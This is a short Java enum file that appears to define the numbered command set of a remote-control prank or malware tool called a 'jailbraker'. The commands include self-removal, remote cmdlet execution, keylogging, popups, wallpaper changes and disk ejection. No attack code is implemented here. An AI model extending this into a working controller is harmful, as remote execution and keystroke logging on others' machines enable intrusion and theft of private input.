package com.example.jailor;

import java.util.HashMap;
import java.util.Map;

public enum JB_Instruction {
    /* --- Templates --- */
    JB_DEACTIVE(0),    // Deactive jailbraker
    JB_FUN(1),
    JB_REMOVE(2),      // Delete from pc completely

    /* --- Sounds --- */
    JB_VOLUME(3),
    JB_MUTE(4),
    JB_SZAMBO(5), // pay sound

    /* --- Wallpaper --- */
    JB_SETWALL(6),
    JB_SAVEWALL(7),
    JB_LOADWALL(8),

    /* --- Shortcuts --- */
    JB_CREATELINKS(9),
    JB_REMOVELINKS(10),

    /* --- Other --- */
    JB_OPENWEB(11),     // Open website in default browser
    JB_CDEJECT(12),     // Eject disk drive
    JB_POPUPW(13),      // MessageBoxW
    JB_POPUPA(14),      // MessageBoxA
    JB_EXEC(15),        // execute a cmdlet
    JB_ROTATESCR(16),   // SetDisplayAutoRotationPreferences
    JB_CHANGERES(17),
    JB_LOGKEYS(18),     // keylogging bruh.
    DEV_MODE(19);

    private int value;
    private static Map map = new HashMap<>();

    private JB_Instruction(int value) {
        this.value = value;
    }

    static {
        for (JB_Instruction jb_instruction : JB_Instruction.values()) {
            map.put(jb_instruction.value, jb_instruction);
        }
    }

    public static JB_Instruction valueOf(int pageType) {
        return (JB_Instruction) map.get(pageType);
    }

    public int getValue() {
        return value;
    }
}
